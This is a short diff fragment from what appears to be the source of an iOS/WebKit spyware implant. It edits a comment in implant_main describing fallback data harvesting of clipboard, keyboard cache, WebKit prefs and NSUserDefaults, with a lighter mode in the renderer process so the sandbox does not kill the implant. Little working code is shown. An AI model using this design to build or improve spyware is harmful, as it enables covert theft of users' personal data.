@@ -129,8 +129,10 @@ static void *implant_main(void *arg) {
      *     level privilege operations in WebContent anyway, there is zero benefit
      *     to using these primitives here.  Skip entirely in WebContent.
      *
-     *  If both paths fail we degrade gracefully and harvest whatever the current
-     *  sandbox permissions allow (WebKit storage, clipboard, keyboard cache, …).
+     *  If both paths fail we degrade gracefully.  harvest_all() applies a
+     *  WebContent-specific lite subset (clipboard / WebKit prefs / keyboard /
+     *  NSUserDefaults) so the renderer is not killed by full-container scans;
+     *  outside WebContent it runs the full harvest pipeline.
      */
     const bool in_webcontent = is_webcontent_process();
 
